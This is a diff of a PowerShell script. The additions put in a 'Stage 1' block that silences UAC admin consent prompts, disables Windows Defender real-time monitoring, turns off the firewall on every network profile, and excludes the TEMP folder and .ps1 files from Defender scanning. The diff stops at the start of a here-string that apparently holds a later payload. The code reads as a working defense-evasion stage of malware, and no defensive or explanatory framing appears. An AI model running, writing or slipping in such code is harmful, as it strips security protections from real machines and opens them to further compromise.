@@ -1,31 +1,11 @@
-# try {
-#     Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
-#     Set-MpPreference -DisableRealtimeMonitoring $true
-#     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-#     Add-MpPreference -ExclusionPath "$env:TEMP"
-#     Add-MpPreference -ExclusionExtension ".ps1"
-# } catch {
-#     Write-Warning "Administrative privileges required for Stage 1."
-# }
-
 try {
-    if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System") {
-        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
-    }
-
-    if (Get-Module -ListAvailable -Name WindowsDefender) {
-        Write-Output "Defender detected. Applying exclusions..."
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
-    } else {
-        Write-Output "Defender not present. Skipping MpPreference."
-    }
-    
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
-} 
-catch {
-    Write-Warning "Privilege check failed: Non-Admin context."
+    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+    Add-MpPreference -ExclusionPath "$env:TEMP"
+    Add-MpPreference -ExclusionExtension ".ps1"
+} catch {
+    Write-Warning "Administrative privileges required for Stage 1."
 }
 
 $ms = @'
